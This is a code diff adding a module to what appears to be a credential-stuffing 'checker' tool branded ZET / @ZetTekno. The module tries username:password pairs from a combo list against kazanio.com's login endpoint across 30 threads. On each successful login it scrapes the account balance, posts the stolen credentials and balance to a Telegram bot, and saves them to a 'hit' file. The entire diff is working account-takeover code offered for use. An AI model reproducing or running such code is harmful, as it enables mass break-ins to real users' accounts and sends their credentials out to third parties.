@@ -1257,6 +1257,331 @@ def checker():
         
         a30 = threading.Thread(target=c30)
         a30.start()
+    def kazanio():
+        clear()
+        banner()
+        
+        def bsl(mp):
+                try:
+                    mp=mp.replace("\n","")
+                    user = mp.split(':')[0]
+                    pas = mp.split(':')[1]
+                    url="https://www.kazanio.com/user/loginmember"
+                    ses=requests.Session()
+                    dat=f"username={user}&password={pas}&rememberme=1&type=member"
+                    hea={
+                    "x-requested-with":"XMLHttpRequest",
+                    "host":"www.kazanio.com",
+                    "origin":"https://www.kazanio.com",
+                    "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
+                    "accept":"*/*",
+                    "referer":"https://www.kazanio.com/login",
+                    "user-agent":"Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.78 Mobile Safari/537.36"
+                    }
+                    p=ses.post(url,headers=hea,data=dat).text
+                    
+                    if not "error" in str(p):
+                        x=ses.get("https://www.kazanio.com/member/user#!").text
+                        x=str(x)
+                        try:
+                            x=re.findall('-user-balance">(.*?)</span>',x)[0]
+                            bakiye=x
+                            ms="""
+╭─➢ ☄ ZET| Kazanio.com Checker ☄
+├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
+├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
+├◉[ Bakiye ]   """+str(bakiye)+"""
+╰─◉➤ Telegram Channel: @ZetTekno\n
+            """
+                        except:
+                            ms="""
+╭─➢ ☄ ZET| Kazanio.com Checker ☄
+├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
+├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
+╰─◉➤ Telegram Channel: @ZetTekno\n
+            """
+                        try:
+                            tele=open("tele","r").read()
+                            idm=open("idm","r").read()
+                            requests.post(f"https://api.telegram.org/bot{tele}/sendMessage?chat_id={idm}&text={ms}")
+                        except:
+                            pass
+                        print(ms)
+                        open(cihaz+"hit-(Kazanio.com).txt","a").write(ms)
+                    else:
+                        print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
+                except:
+                    pass
+
+        def c1():
+            for zet in range(0,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c2():
+            for zet in range(1,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c3():
+            for zet in range(2,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c4():
+            for zet in range(3,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c5():
+            for zet in range(4,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c6():
+            for zet in range(5,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c7():
+            for zet in range(6,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c8():
+            for zet in range(7,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c9():
+            for zet in range(8,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c10():
+            for zet in range(9,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c11():
+            for zet in range(10,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c12():
+            for zet in range(11,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c13():
+            for zet in range(12,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c14():
+            for zet in range(13,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c15():
+            for zet in range(14,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c16():
+            for zet in range(15,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c17():
+            for zet in range(16,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c18():
+            for zet in range(17,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c19():
+            for zet in range(18,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c20():
+            for zet in range(19,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c21():
+            for zet in range(20,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c22():
+            for zet in range(21,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c23():
+            for zet in range(22,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c24():
+            for zet in range(23,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c25():
+            for zet in range(24,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c26():
+            for zet in range(25,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c27():
+            for zet in range(26,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c28():
+            for zet in range(27,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c29():
+            for zet in range(28,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        def c30():
+            for zet in range(29,uz,30):
+                up=total[zet].split(' ')[0]
+                mp=up.replace('\n','')
+                bsl(mp)
+        
+        a1 = threading.Thread(target=c1)
+        a1.start()
+        
+        a2 = threading.Thread(target=c2)
+        a2.start()
+        
+        a3 = threading.Thread(target=c3)
+        a3.start()
+        
+        a4 = threading.Thread(target=c4)
+        a4.start()
+        
+        a5 = threading.Thread(target=c5)
+        a5.start()
+        
+        a6 = threading.Thread(target=c6)
+        a6.start()
+        
+        a7 = threading.Thread(target=c7)
+        a7.start()
+        
+        a8 = threading.Thread(target=c8)
+        a8.start()
+        
+        a9 = threading.Thread(target=c9)
+        a9.start()
+        
+        a10 = threading.Thread(target=c10)
+        a10.start()
+        
+        a11 = threading.Thread(target=c11)
+        a11.start()
+        
+        a12 = threading.Thread(target=c12)
+        a12.start()
+        
+        a13 = threading.Thread(target=c13)
+        a13.start()
+        
+        a14 = threading.Thread(target=c14)
+        a14.start()
+        
+        a15 = threading.Thread(target=c15)
+        a15.start()
+        
+        a16 = threading.Thread(target=c16)
+        a16.start()
+        
+        a17 = threading.Thread(target=c17)
+        a17.start()
+        
+        a18 = threading.Thread(target=c18)
+        a18.start()
+        
+        a19 = threading.Thread(target=c19)
+        a19.start()
+        
+        a20 = threading.Thread(target=c20)
+        a20.start()
+        
+        a21 = threading.Thread(target=c21)
+        a21.start()
+        
+        a22 = threading.Thread(target=c22)
+        a22.start()
+        
+        a23 = threading.Thread(target=c23)
+        a23.start()
+        
+        a24 = threading.Thread(target=c24)
+        a24.start()
+        
+        a25 = threading.Thread(target=c25)
+        a25.start()
+        
+        a26 = threading.Thread(target=c26)
+        a26.start()
+        
+        a27 = threading.Thread(target=c27)
+        a27.start()
+        
+        a28 = threading.Thread(target=c28)
+        a28.start()
+        
+        a29 = threading.Thread(target=c29)
+        a29.start()
+        
+        a30 = threading.Thread(target=c30)
+        a30.start()
 
     def chkgain():
         clear()
@@ -1360,6 +1685,8 @@ def checker():
         m3u()
     if hesap=="9":
         onaylat()
+    if hesap=="10":
+        kazanio()
 def ayar():
     clear()
     banner()
